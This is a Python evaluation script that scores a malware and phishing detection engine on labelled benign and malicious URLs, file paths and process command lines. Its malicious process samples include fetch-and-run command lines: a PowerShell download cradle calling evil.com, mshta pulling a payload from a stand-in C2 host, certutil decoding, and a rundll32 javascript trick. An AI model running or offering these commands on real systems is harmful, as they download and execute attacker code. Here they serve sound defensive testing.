"""
tests/evaluation/evaluate_abtd.py
===================================
ABTD Detection Engine Evaluation

Runs the full 5-layer ABTD engine on a curated set of known-good and
known-bad URLs/files/processes and prints a comprehensive report with:
  - Detection rate (DR) for malicious samples
  - False positive rate (FPR) for benign samples
  - Score distribution per classification level
  - Layer-by-layer score breakdown
  - Per-sample detailed results table

Usage:
    python tests/evaluation/evaluate_abtd.py
    python tests/evaluation/evaluate_abtd.py --type url
    python tests/evaluation/evaluate_abtd.py --type file
    python tests/evaluation/evaluate_abtd.py --type process
"""

import sys
import argparse
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))


# ─────────────────────────────────────────────────────────────────────────────
# Test Datasets
# ─────────────────────────────────────────────────────────────────────────────

URL_BENIGN = [
    "https://google.com",
    "https://github.com",
    "https://stackoverflow.com",
    "https://microsoft.com",
    "https://wikipedia.org",
    "https://amazon.com",
    "https://youtube.com",
    "https://reddit.com",
    "https://linkedin.com",
    "https://apple.com",
]

URL_MALICIOUS = [
    "http://192.168.1.100/paypal-login/verify",
    "http://paypal-login-secure.xyz/account/update",
    "http://amazon-account.tk/verify-credentials",
    "http://bit.ly/3xFakePhishing",
    "http://45.33.32.156/malware/payload.exe",
    "http://free-iphone-win.click/claim-prize?user=victim@victim.com",
    "http://192.0.2.1/banking/login%20secure/verify%20account%40user",
    "http://update.microsoft.com.evil-phish.xyz/patch.exe",
    "http://secure-banking.login-verify.info/account/update",
    "http://download.exe.ml/payload.bat",
]

FILE_BENIGN = [
    r"C:\Windows\System32\notepad.exe",
    r"C:\Windows\System32\cmd.exe",
    r"C:\Users\user\Documents\report.pdf",
    r"C:\Program Files\Python311\python.exe",
    r"C:\Users\user\Desktop\presentation.pptx",
]

FILE_MALICIOUS = [
    r"C:\Users\user\AppData\Local\Temp\payload.exe",
    r"C:\Temp\malware.bat",
    r"C:\Downloads\invoice.pdf.exe",
    r"C:\Users\user\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.ps1",
    r"C:\Temp\update.exe.vbs",
]

PROCESS_BENIGN = [
    ("notepad.exe",  "notepad.exe C:\\Users\\user\\file.txt"),
    ("chrome.exe",   "chrome.exe --profile-directory=Default"),
    ("explorer.exe", "C:\\Windows\\explorer.exe"),
    ("python.exe",   "python.exe tests/evaluate_abtd.py"),
    ("code.exe",     "code.exe --folder-uri=vscode-remote://..."),
]

PROCESS_MALICIOUS = [
    ("powershell.exe", "powershell.exe -EncodedCommand SGVsbG8gV29ybGQ= -nop -WindowStyle Hidden"),
    ("cmd.exe",        "cmd.exe /c certutil -decode payload.b64 payload.exe"),
    ("powershell.exe", "powershell -nop -c iex (New-Object Net.WebClient).DownloadString('http://evil.com')"),
    ("cmd.exe",        "cmd.exe /c mshta.exe http://c2.evil.xyz/payload.hta"),
    ("cmd.exe",        "rundll32.exe javascript:'\\..\\mshtml,RunHTMLApplication'"),
]


# ─────────────────────────────────────────────────────────────────────────────
# Helpers
# ─────────────────────────────────────────────────────────────────────────────

def banner(title: str):
    print("\n" + "═" * 68)
    print(f"  {title}")
    print("═" * 68)


def score_to_class(score: int) -> str:
    if score < 25:  return "SAFE"
    if score < 50:  return "SUSPICIOUS"
    if score < 75:  return "MALICIOUS"
    return "CRITICAL"


def print_summary(label: str, results: list, is_malicious: bool):
    detected = sum(1 for r in results if r["classification"] not in ("SAFE",))
    if is_malicious:
        rate = detected / len(results) * 100 if results else 0
        print(f"\n  {label}")
        print(f"  ├ Samples         : {len(results)}")
        print(f"  ├ Detected        : {detected}/{len(results)}")
        print(f"  └ Detection Rate  : {rate:.1f}%")
    else:
        fp = detected
        fpr = fp / len(results) * 100 if results else 0
        print(f"\n  {label}")
        print(f"  ├ Samples         : {len(results)}")
        print(f"  ├ False Positives : {fp}/{len(results)}")
        print(f"  └ FP Rate         : {fpr:.1f}%")


def print_table(results: list, col1_name: str, col1_key: str):
    print(f"\n  {'#':>3}  {col1_name:<45}  {'SCORE':>6}  {'CLASS':<12}  {'CONF':>6}")
    print("  " + "-" * 78)
    icons = {"SAFE": "✅", "SUSPICIOUS": "⚠️ ", "MALICIOUS": "🚫", "CRITICAL": "🔴"}
    for i, r in enumerate(results, 1):
        cls  = r.get("classification", "?")
        icon = icons.get(cls, "?")
        name = str(r.get(col1_key, "?"))[:43]
        print(
            f"  {i:>3}  {name:<45}  {r.get('threat_score',0):>6}  "
            f"{icon} {cls:<10}  {r.get('confidence',0):.3f}"
        )


# ─────────────────────────────────────────────────────────────────────────────
# URL Evaluation
# ─────────────────────────────────────────────────────────────────────────────

def evaluate_urls():
    banner("URL Threat Detection Evaluation")
    from engine.predictor import ABTDEngine
    engine = ABTDEngine()

    benign_results   = []
    malicious_results = []

    print("\n  Scanning benign URLs (skip_reputation=True for speed)...")
    for url in URL_BENIGN:
        r = engine.analyze_url(url, skip_reputation=True)
        r["url"] = url
        benign_results.append(r)
        print(f"  ✅ {url[:50]:<52} score={r['threat_score']:>3}  {r['classification']}")

    print("\n  Scanning malicious URLs...")
    for url in URL_MALICIOUS:
        r = engine.analyze_url(url, skip_reputation=True)
        r["url"] = url
        malicious_results.append(r)
        cls_icon = "✅" if r["classification"] == "SAFE" else "🚨"
        print(f"  {cls_icon} {url[:50]:<52} score={r['threat_score']:>3}  {r['classification']}")

    print_summary("Benign URL Summary",   benign_results,    is_malicious=False)
    print_summary("Malicious URL Summary", malicious_results, is_malicious=True)

    print("\n  ── Benign URLs ──")
    print_table(benign_results,    "URL", "url")
    print("\n  ── Malicious URLs ──")
    print_table(malicious_results, "URL", "url")


# ─────────────────────────────────────────────────────────────────────────────
# File Evaluation
# ─────────────────────────────────────────────────────────────────────────────

def evaluate_files():
    banner("File Threat Detection Evaluation")
    from engine.predictor import ABTDEngine
    engine = ABTDEngine()

    benign_results    = []
    malicious_results = []

    print("\n  Scanning benign files...")
    for path in FILE_BENIGN:
        r = engine.analyze_file(path)
        r["target"] = path
        benign_results.append(r)
        print(f"  ✅ {Path(path).name:<35} score={r['threat_score']:>3}  {r['classification']}")

    print("\n  Scanning malicious paths...")
    for path in FILE_MALICIOUS:
        r = engine.analyze_file(path)
        r["target"] = path
        malicious_results.append(r)
        cls_icon = "✅" if r["classification"] == "SAFE" else "🚨"
        print(f"  {cls_icon} {Path(path).name:<35} score={r['threat_score']:>3}  {r['classification']}")

    print_summary("Benign File Summary",    benign_results,    is_malicious=False)
    print_summary("Malicious File Summary", malicious_results, is_malicious=True)

    print("\n  ── Benign Files ──")
    print_table(benign_results,    "File Path", "target")
    print("\n  ── Malicious Files ──")
    print_table(malicious_results, "File Path", "target")


# ─────────────────────────────────────────────────────────────────────────────
# Process Evaluation
# ─────────────────────────────────────────────────────────────────────────────

def evaluate_processes():
    banner("Process Threat Detection Evaluation")
    from engine.predictor import ABTDEngine
    engine = ABTDEngine()

    benign_results    = []
    malicious_results = []
    dummy_pid         = 99990

    print("\n  Analyzing benign processes...")
    for name, cmdline in PROCESS_BENIGN:
        r = engine.analyze_process(dummy_pid, name, cmdline)
        r["target"] = name
        benign_results.append(r)
        print(f"  ✅ {name:<25} score={r['threat_score']:>3}  {r['classification']}")

    print("\n  Analyzing malicious processes...")
    for name, cmdline in PROCESS_MALICIOUS:
        r = engine.analyze_process(dummy_pid, name, cmdline)
        r["target"] = name
        malicious_results.append(r)
        cls_icon = "✅" if r["classification"] == "SAFE" else "🚨"
        print(f"  {cls_icon} {name:<25} score={r['threat_score']:>3}  {r['classification']}")
        if r["reasons"]:
            print(f"      └ {r['reasons'][0]}")

    print_summary("Benign Process Summary",    benign_results,    is_malicious=False)
    print_summary("Malicious Process Summary", malicious_results, is_malicious=True)

    print("\n  ── Benign Processes ──")
    print_table(benign_results,    "Process", "target")
    print("\n  ── Malicious Processes ──")
    print_table(malicious_results, "Process", "target")


# ─────────────────────────────────────────────────────────────────────────────
# Main
# ─────────────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description="ABTD Detection Engine Evaluator")
    parser.add_argument("--type", choices=["url", "file", "process", "all"],
                        default="all")
    args = parser.parse_args()

    print("\n🔬 ABTD Detection Engine Evaluation")
    print("=" * 68)
    start = time.time()

    if args.type in ("url",     "all"): evaluate_urls()
    if args.type in ("file",    "all"): evaluate_files()
    if args.type in ("process", "all"): evaluate_processes()

    print(f"\n✅ ABTD evaluation complete in {time.time() - start:.1f}s")


if __name__ == "__main__":
    main()
